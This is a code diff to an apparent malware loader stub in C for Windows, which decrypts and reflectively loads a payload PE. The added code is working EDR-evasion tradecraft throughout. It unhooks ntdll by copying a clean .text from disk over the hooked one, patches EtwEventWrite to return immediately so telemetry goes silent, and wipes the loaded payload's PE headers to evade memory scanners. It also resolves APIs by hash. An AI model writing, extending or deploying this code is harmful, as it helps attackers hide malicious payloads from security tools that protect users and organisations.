@@ -294,6 +294,14 @@ static void _derive_key(const unsigned char *seed, unsigned int seedlen,
 #define H_NtProtectVirtualMemory    0x1AF70505
 #define H_NtFreeVirtualMemory       0xD780C6BE
 
+/* Unhooking API hashes — ntdll clean-copy restoration */
+#define H_CreateFileMappingA        0xA1C573C3
+#define H_MapViewOfFile             0x447430C9
+#define H_UnmapViewOfFile           0x776D9A5A
+
+/* ETW patching hash — blind EDR telemetry */
+#define H_EtwEventWrite             0x50EF17B1
+
 /* Debug API hashes — only used with STUB_DEBUG */
 #define H_CreateFileA               0x7DCE10F7
 #define H_WriteFile                 0x46CE0FF3
@@ -399,6 +407,173 @@ static void _dbg_hex(const char *label, unsigned long long val) {
 #define SLOG(msg)       ((void)0)
 #define SHEX(label, v)  ((void)0)
 #endif
+
+
+/* ═══════════════════════════════════════════════════════════════════
+ * ntdll unhooking — restore clean .text from disk
+ *
+ * EDRs inline-hook ntdll functions (NtAllocateVirtualMemory, etc.)
+ * by patching the first bytes to a JMP into their DLL. We read a
+ * fresh copy of ntdll.dll from disk, find the .text section, and
+ * overwrite the loaded (hooked) .text with the clean bytes.
+ *
+ * After this, all ntdll function calls bypass EDR hooks.
+ *
+ * Uses kernel32 file APIs (CreateFileA, CreateFileMappingA,
+ * MapViewOfFile) which EDRs generally do not hook — they hook
+ * the Nt* layer below.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+/* Function pointer types needed by unhooking / ETW patching.
+ * Declared here (above _unhook_ntdll) so they're available in
+ * both debug and release builds. */
+typedef HANDLE (WINAPI *fnCreateFileA_u_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef BOOL   (WINAPI *fnCloseHandle_u_t)(HANDLE);
+typedef BOOL   (WINAPI *fnVirtualProtect_u_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef HANDLE (WINAPI *fnCreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
+typedef LPVOID (WINAPI *fnMapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef BOOL   (WINAPI *fnUnmapViewOfFile_t)(LPCVOID);
+
+static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base) {
+    /* Resolve file mapping APIs from kernel32 */
+    fnCreateFileA_u_t pCreateFileA = (fnCreateFileA_u_t)_resolve_export(k32, H_CreateFileA);
+    fnCloseHandle_u_t pCloseHandle = (fnCloseHandle_u_t)_resolve_export(k32, H_CloseHandle);
+    fnCreateFileMappingA_t pCreateFileMappingA =
+        (fnCreateFileMappingA_t)_resolve_export(k32, H_CreateFileMappingA);
+    fnMapViewOfFile_t pMapViewOfFile =
+        (fnMapViewOfFile_t)_resolve_export(k32, H_MapViewOfFile);
+    fnUnmapViewOfFile_t pUnmapViewOfFile =
+        (fnUnmapViewOfFile_t)_resolve_export(k32, H_UnmapViewOfFile);
+
+    if (!pCreateFileA || !pCloseHandle || !pCreateFileMappingA ||
+        !pMapViewOfFile || !pUnmapViewOfFile) {
+        SLOG("[stub] unhook: missing file APIs — skipped");
+        return;
+    }
+
+    /* Open clean ntdll.dll from disk
+     * Use the KnownDlls path via System32 — guaranteed unmodified on disk */
+    HANDLE hFile = pCreateFileA(
+        "C:\\Windows\\System32\\ntdll.dll",
+        GENERIC_READ, FILE_SHARE_READ, NULL,
+        OPEN_EXISTING, 0, NULL);
+    if (hFile == (HANDLE)-1) {
+        SLOG("[stub] unhook: CreateFileA failed");
+        return;
+    }
+
+    /* Map the file as data (NOT SEC_IMAGE — that would go through hooks) */
+    HANDLE hMap = pCreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_COMMIT,
+                                      0, 0, NULL);
+    if (!hMap) {
+        pCloseHandle(hFile);
+        SLOG("[stub] unhook: CreateFileMappingA failed");
+        return;
+    }
+
+    BYTE *cleanNtdll = (BYTE *)pMapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+    if (!cleanNtdll) {
+        pCloseHandle(hMap);
+        pCloseHandle(hFile);
+        SLOG("[stub] unhook: MapViewOfFile failed");
+        return;
+    }
+
+    /* Parse the clean copy's PE headers to find .text section */
+    IMAGE_DOS_HEADER *cleanDos = (IMAGE_DOS_HEADER *)cleanNtdll;
+    if (cleanDos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
+
+    IMAGE_NT_HEADERS *cleanNt = (IMAGE_NT_HEADERS *)(cleanNtdll + cleanDos->e_lfanew);
+    if (cleanNt->Signature != IMAGE_NT_SIGNATURE) goto cleanup;
+
+    /* Also parse the loaded (hooked) ntdll */
+    IMAGE_DOS_HEADER *loadedDos = (IMAGE_DOS_HEADER *)ntdll_base;
+    IMAGE_NT_HEADERS *loadedNt = (IMAGE_NT_HEADERS *)(ntdll_base + loadedDos->e_lfanew);
+
+    /* Walk sections in the loaded copy to find .text */
+    IMAGE_SECTION_HEADER *loadedSec = IMAGE_FIRST_SECTION(loadedNt);
+    IMAGE_SECTION_HEADER *cleanSec  = IMAGE_FIRST_SECTION(cleanNt);
+
+    for (WORD i = 0; i < loadedNt->FileHeader.NumberOfSections; i++) {
+        /* Match by name: .text */
+        if (loadedSec[i].Name[0] == '.' &&
+            loadedSec[i].Name[1] == 't' &&
+            loadedSec[i].Name[2] == 'e' &&
+            loadedSec[i].Name[3] == 'x' &&
+            loadedSec[i].Name[4] == 't')
+        {
+            /* Found .text — replace loaded (hooked) code with clean bytes.
+             * The clean copy is a flat file mapping, so we use
+             * PointerToRawData for the offset into the clean mapping,
+             * and VirtualAddress for the offset into the loaded image. */
+            BYTE *hookedText = ntdll_base + loadedSec[i].VirtualAddress;
+            BYTE *cleanText  = cleanNtdll + cleanSec[i].PointerToRawData;
+            DWORD textSize   = loadedSec[i].Misc.VirtualSize;
+
+            /* VirtualProtect the loaded .text to RWX so we can overwrite */
+            DWORD oldProtect;
+            fnVirtualProtect_u_t pVP = (fnVirtualProtect_u_t)_resolve_export(k32, H_VirtualProtect);
+            if (!pVP) break;
+
+            pVP(hookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+            /* Copy clean .text over hooked .text */
+            for (DWORD j = 0; j < textSize; j++)
+                hookedText[j] = cleanText[j];
+
+            /* Restore original protection */
+            pVP(hookedText, textSize, oldProtect, &oldProtect);
+
+            SLOG("[stub] unhook: ntdll .text restored");
+            SHEX("[stub] unhook: .text size", textSize);
+            break;
+        }
+    }
+
+cleanup:
+    pUnmapViewOfFile(cleanNtdll);
+    pCloseHandle(hMap);
+    pCloseHandle(hFile);
+}
+
+
+/* ═══════════════════════════════════════════════════════════════════
+ * ETW patching — blind EDR telemetry
+ *
+ * EDRs subscribe to ETW (Event Tracing for Windows) providers in
+ * ntdll to receive telemetry about .NET loading, thread creation,
+ * image loads, etc. Patching EtwEventWrite to immediately return 0
+ * (STATUS_SUCCESS) silences this entire telemetry channel.
+ *
+ *   Before: EtwEventWrite → full event logging
+ *   After:  EtwEventWrite → xor eax, eax; ret (3 bytes)
+ * ═══════════════════════════════════════════════════════════════════ */
+
+static void _patch_etw(BYTE *k32, BYTE *ntdll_base) {
+    /* Find EtwEventWrite in ntdll exports */
+    BYTE *pEtwEventWrite = (BYTE *)_resolve_export(ntdll_base, H_EtwEventWrite);
+    if (!pEtwEventWrite) {
+        SLOG("[stub] etw: EtwEventWrite not found");
+        return;
+    }
+
+    /* Make writable */
+    fnVirtualProtect_u_t pVP = (fnVirtualProtect_u_t)_resolve_export(k32, H_VirtualProtect);
+    if (!pVP) return;
+
+    DWORD oldProtect;
+    pVP(pEtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+    /* Patch: xor eax, eax (0x33 0xC0) ; ret (0xC3) */
+    pEtwEventWrite[0] = 0x33;  /* xor eax, eax */
+    pEtwEventWrite[1] = 0xC0;
+    pEtwEventWrite[2] = 0xC3;  /* ret */
+
+    /* Restore protection */
+    pVP(pEtwEventWrite, 4, oldProtect, &oldProtect);
+
+    SLOG("[stub] etw: EtwEventWrite patched");
+}
 
 
 /* ═══════════════════════════════════════════════════════════════════
@@ -509,6 +684,50 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
                api->pExitProcess);
     SLOG(ok ? "[stub] all APIs OK" : "[stub] FAIL: missing critical API");
     return ok;
+}
+
+
+/* ═══════════════════════════════════════════════════════════════════
+ * PE header wiping — defeat memory scanners
+ *
+ * After the reflective loader maps the payload into memory, its PE
+ * headers (MZ signature, PE signature, section table) remain at the
+ * start of the allocation. EDR memory scanners walk process memory
+ * looking for these signatures to find injected/reflectively loaded
+ * PEs. Zeroing the first page erases all headers.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+static void _wipe_pe_headers(BYTE *base, RESOLVED_APIS *api) {
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
+    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
+
+    /* Make headers writable */
+    if (api->pNtProtectVirtualMemory) {
+        PVOID region = base;
+        SIZE_T sz = headerSize;
+        ULONG old;
+        api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
+                                     PAGE_READWRITE, &old);
+    } else {
+        DWORD old;
+        api->pVirtualProtect(base, headerSize, PAGE_READWRITE, &old);
+    }
+
+    /* Zero all headers */
+    for (DWORD i = 0; i < headerSize; i++)
+        base[i] = 0;
+
+    /* Set to no-access — makes the region invisible to memory scans */
+    if (api->pNtProtectVirtualMemory) {
+        PVOID region = base;
+        SIZE_T sz = headerSize;
+        ULONG old;
+        api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
+                                     PAGE_NOACCESS, &old);
+    }
+
+    SLOG("[stub] headers wiped");
 }
 
 
@@ -845,15 +1064,21 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     }
 #endif
 
-    /* Call entry point */
+    /* Wipe PE headers — must happen AFTER relocs/imports/TLS but BEFORE
+     * entry point, so the payload code runs with no MZ/PE signature in
+     * memory for EDR scanners to find. Save entryRVA first since the
+     * headers will be zeroed. */
     DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
+    WORD peChars   = mappedNt->FileHeader.Characteristics;
     if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }
+
+    _wipe_pe_headers(base, api);
 
     void *entry = base + entryRVA;
     SHEX("[stub] entry", (ULONG_PTR)entry);
     SLOG("[stub] calling entry...");
 
-    if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
+    if (peChars & IMAGE_FILE_DLL) {
         DllMain_t dllMain = (DllMain_t)entry;
         dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
     } else {
@@ -968,6 +1193,43 @@ void _stub_entry(void) {
         _dbg_close();
 #endif
         return;
+    }
+
+    /* Phase 1.5: EDR evasion — unhook ntdll + patch ETW
+     *
+     * MUST happen BEFORE any Nt* calls (decrypt, alloc, load) so that
+     * those calls go through clean, unhooked code paths.
+     *
+     *   1. _unhook_ntdll: reads a clean copy of ntdll.dll from disk
+     *      and overwrites the loaded (hooked) .text section, removing
+     *      all EDR inline hooks.
+     *
+     *   2. _patch_etw: patches EtwEventWrite to immediately return 0,
+     *      silencing the ETW telemetry pipeline that feeds EDR sensors.
+     *
+     * Both use kernel32 file/memory APIs (unhhooked by EDR) to perform
+     * the patching. After this point the EDR is effectively blind to
+     * our ntdll-level operations.
+     */
+    {
+        BYTE *k32   = _find_module(H_KERNEL32);
+        BYTE *ntdll = _find_module(H_NTDLL);
+        if (k32 && ntdll) {
+            _unhook_ntdll(k32, ntdll);
+            _patch_etw(k32, ntdll);
+
+            /* Re-resolve Nt* APIs — the function bodies are now
+             * clean but the addresses haven't changed. However,
+             * re-resolving ensures we pick up the correct entry
+             * points in case the EDR had trampolined elsewhere. */
+            api.pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory_t)
+                _resolve_export(ntdll, H_NtAllocateVirtualMemory);
+            api.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory_t)
+                _resolve_export(ntdll, H_NtProtectVirtualMemory);
+            api.pNtFreeVirtualMemory = (fnNtFreeVirtualMemory_t)
+                _resolve_export(ntdll, H_NtFreeVirtualMemory);
+            SLOG("[stub] Nt* re-resolved after unhook");
+        }
     }
 
     /* Phase 2: Derive RC4 key from seed */
